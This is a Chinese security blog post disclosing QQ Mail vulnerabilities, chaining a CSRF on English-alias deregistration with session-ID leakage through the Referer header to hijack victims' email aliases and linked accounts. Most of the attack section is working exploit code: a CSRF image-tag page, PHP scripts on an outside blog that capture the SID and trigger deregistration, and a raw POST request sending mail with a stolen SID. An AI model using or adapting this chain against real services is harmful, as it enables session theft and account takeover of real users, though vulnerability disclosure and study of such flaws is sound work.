> 原文链接: https://www.anquanke.com//post/id/82430 


# QQ邮箱重要参数暴露致安全性低下#附EXP


                                阅读量   
                                **153208**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t0187b9945560301305.jpg)](https://p2.ssl.qhimg.com/t0187b9945560301305.jpg)

前段时间补天收到蓝方同学提交的一个腾讯QQ邮箱漏洞，小编觉得这个漏洞挺好玩的，就先给大家分享出来。



**第一个：【英文邮箱的重要性】**

前言：一个人注销英文邮箱以后，别人可以再一次申请这个英文邮箱，那么问题来了！

如果一个人被动注销，再由黑客注册，那么这个人在其他网站注册的账号密保将会落入黑客之手，十分的危险呀！

 

[![](https://p1.ssl.qhimg.com/t01f696bb94a381719a.jpg)](https://p1.ssl.qhimg.com/t01f696bb94a381719a.jpg)



  上图有两个邮箱，一个英文邮箱，一个是QQ号邮箱。

  英文邮箱是很热门的，因为现在很多人习惯依赖于腾讯的产品，但是又不想暴露自己的QQ号，但是这类邮箱有一个很大的弊端，就是申请注销后，别人可以直接申请。



来源验证：

 

[![](https://p1.ssl.qhimg.com/t0183ac466370ee02d6.png)](https://p1.ssl.qhimg.com/t0183ac466370ee02d6.png)



当我们注销英文邮箱的时候，我们发现有一个十五天注销的限制，如果是盗号，肯定会被察觉，只有CSRF可以悄无声息的完成这些操作。

 

[![](https://p0.ssl.qhimg.com/t014817986e1ac1eb3d.png)](https://p0.ssl.qhimg.com/t014817986e1ac1eb3d.png)



[![](https://p5.ssl.qhimg.com/t0189cad54dfec24631.jpg)](https://p5.ssl.qhimg.com/t0189cad54dfec24631.jpg)

这里是GET请求进行提交的，然后我们去除来源（referer）验证了一下，也用poc测试了一下

然后洞主自己写了test页看看效果

[![](https://p3.ssl.qhimg.com/t01435ced6788515552.png)](https://p3.ssl.qhimg.com/t01435ced6788515552.png)

 

代码是：

```
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html;charset=UTF-8"&gt;
&lt;title&gt;test&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;img src="http://set1.mail.qq.com/cgi-bin/modify_alias?action=apply&amp;sid=FQm36TMwNtZsZWYz&amp;t=apply_delalias&amp;s=done&amp;alias=cnmlgb.vip@qq.com"/&gt;
&lt;/body&gt;
&lt;/html&gt;
```

 

[![](https://p3.ssl.qhimg.com/t019dd2257ef8b914a1.png)](https://p3.ssl.qhimg.com/t019dd2257ef8b914a1.png)



然后登上十五天就可以成功了。

总结：因为QQ邮箱放弃了来源验证。



大家觉得高潮就这么结束了吗？当然没有啦。现在漏洞陷入了难关，洞主想给他发一个链接，然后让别人点击，这样他的邮箱十五天后就注销成功了，然后黑客再去注册，然后盗取他的所有账号密码。



但是事实上是这样：

 

[![](https://p2.ssl.qhimg.com/t01bdbd492502941b50.png)](https://p2.ssl.qhimg.com/t01bdbd492502941b50.png)



现在我们可以看到URL上面直接显示出了SID，那我们就写点代码直接抓取这个URL吧

```
&lt;html&gt;
     &lt;head&gt;
              &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
              &lt;title&gt;QQmail-CSRF-TEST&lt;/title&gt;
     &lt;/head&gt;
      &lt;body&gt;
&lt;?php
       $ref = $_SERVER['HTTP_REFERER'];
    echo "&lt;div&gt; $ref &lt;/div&gt; ";
?&gt;
       &lt;/body&gt;
&lt;/html&gt;
```

然后洞主自己用自己的博客加了一个test页面，把代码保存在了：

```
http://www.vimaggie.cn/test.php
```

然后洞主就很有想法的，直接自己给自己发了一封邮件，以此来测试URL抓取的效果

 

[![](https://p4.ssl.qhimg.com/t01820d3b6cf64c3eb7.png)](https://p4.ssl.qhimg.com/t01820d3b6cf64c3eb7.png)



输入如下：我们并没有得到SID

 

[![](https://p0.ssl.qhimg.com/t01aa89aa4d0de9a1c9.png)](https://p0.ssl.qhimg.com/t01aa89aa4d0de9a1c9.png)



原因在于URL跳转技术保障了SID的安全性

[![](https://p1.ssl.qhimg.com/t01d29aec6d5767c4cc.png)](https://p1.ssl.qhimg.com/t01d29aec6d5767c4cc.png)





上面就是URL跳转和不跳转的区别，因为采用了URL跳转，所以我们抓取到的是C：URL

洞主经过很久的挖掘，终于找到了两处没有跳转的邮件地址

一个是订阅邮件，一个是阅读日志

 

[![](https://p0.ssl.qhimg.com/t016e5a45b915af2f8e.png)](https://p0.ssl.qhimg.com/t016e5a45b915af2f8e.png)



然后洞主在这个模块里面发了洞主实现写好代码的地址

这样SID就彻底的暴露了出来

 

[![](https://p2.ssl.qhimg.com/t019ad6e5734af65c0d.png)](https://p2.ssl.qhimg.com/t019ad6e5734af65c0d.png)

如果是博客主，或者站长之类的话可以直接去申请订阅，这样攻击简单，受害面也能扩大。

 

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f465ea9798f7b3e7.png)



假设A是完美世界DOTA2的玩家，那么我们申请一个博客，再弄订阅邮件就可以了。

新上线的QQ阅读中也有类似的错误

 

[![](https://p2.ssl.qhimg.com/t01d7a01ad2e122405e.png)](https://p2.ssl.qhimg.com/t01d7a01ad2e122405e.png)



然后洞主把链接丢了上去就返回了SID

 

[![](https://p4.ssl.qhimg.com/t017a7046c8dceb6832.png)](https://p4.ssl.qhimg.com/t017a7046c8dceb6832.png)



**【可以在一个页面内完成获取SID，申请撤销英文邮箱】**

得到后，可以将它SID字段提取出来，保存为参数：

```
&lt;html&gt;
      &lt;head&gt;
              &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
              &lt;title&gt;QQmail-CSRF-TEST&lt;/title&gt;
      &lt;/head&gt;
      &lt;body&gt;
&lt;?php
       $ref = $_SERVER['HTTP_REFERER'];
    echo $ref[45].$ref[46].$ref[47].$ref[48].$ref[49].$ref[50].$ref[51].$ref[52].$ref[53].$ref[54].$ref[55].$ref[56].$ref[57].$ref[58].$ref[59].$ref[60]
?&gt;
       &lt;/body&gt;
&lt;/html&gt;
```

然后洞主依旧吧SID提取出来的脚本保存在自己的博客上

```
http://www.vimaggie.cn/test2.php
```



最后用JS，对账号进行撤销：

脚本如下：

```
&lt;html&gt;
      &lt;head&gt;
              &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
              &lt;title&gt;QQmail-CSRF-TEST&lt;/title&gt;
      &lt;/head&gt;
      &lt;body&gt;
&lt;?php
       $ref = $_SERVER['HTTP_REFERER'];
       $ref2 = $ref[45].$ref[46].$ref[47].$ref[48].$ref[49].$ref[50].$ref[51].$ref[52].$ref[53].$ref[54].$ref[55].$ref[56].$ref[57].$ref[58].$ref[59].$ref[60]
      
?&gt;
      
      &lt;script src="http://set1.mail.qq.com/cgi-bin/modify_alias?action=apply&amp;sid=&lt;?php echo $ref2; ?&gt;&amp;t=apply_delalias&amp;s=done&amp;alias=要抢占的QQ英文邮箱"&gt;
      &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
```

洞主的提取SID，并且注销账号的脚本：

```
http://www.vimaggie.cn/test3.php
```



就这样神不知鬼不觉的十五天后QQ邮箱就是你的。他用这个邮箱注册过的网站账号也是你的了



**第二：【其他劫持】**

SID是很强大的，有了它可以做很好时间，比如在一个文件内，发一封邮件。



```
POST /cgi-bin/compose_send?sid=6PROfaf6r0-1Li14 HTTP/1.1
Host: set1.mail.qq.com
Proxy-Connection: keep-alive
Content-Length: 570
Origin: http://set1.mail.qq.com
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: http://set1.mail.qq.com/zh_CN/htmledition/ajax_proxy.html?mail.qq.com&amp;v=140521
Accept-Encoding: gzip,deflate,sdch
Accept-Language: zh-CN,zh;q=0.8
Cookie: something 
06dac2f71642701dd6f9ee256bd3b121=296531d782e6538303b45ae3190cd6e5&amp;sid=6PROfaf6r0-1Li14&amp;from_s=cnew&amp;to=%22cnmlgb.vip%22&lt;cnmlgb.vip@qq.com&gt;&amp;subject=e&amp;content__html=&lt;div&gt;e&lt;/div&gt;&amp;sendmailname=65067548@qq.com&amp;savesendbox=1&amp;actiontype=send&amp;sendname=èæ¹&amp;acctid=0 &amp;separatedcopy=false&amp;s=comm&amp;hitaddrbook=0&amp;selfdefinestation=-1&amp;domaincheck=0&amp;cgitm=1438282206801&amp;cgitm=1438282206801&amp;clitm=1438282210705&amp;clitm=1438282210705&amp;comtm=1438282605277&amp;comtm=1438282679917&amp;logattcnt=0&amp;logattcnt=0&amp;logattsize=0&amp;logattsize=0&amp;cginame=compose_send&amp;ef=js&amp;t=compose_send.json&amp;resp_charset=UTF8
```



以上参数修改不会有问题，包括时间戳。

只要SID正确就可以发送邮件了





**第三：【发表空间日志】**

任何账号给自己的空间邮箱发送邮件即可发表说说：

```
模板是这个：***@qzone.qq.com
```

 

   

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01997b8c2b5beae160.jpg)



[![](https://p1.ssl.qhimg.com/t017a9ad0184bdff093.png)](https://p1.ssl.qhimg.com/t017a9ad0184bdff093.png)
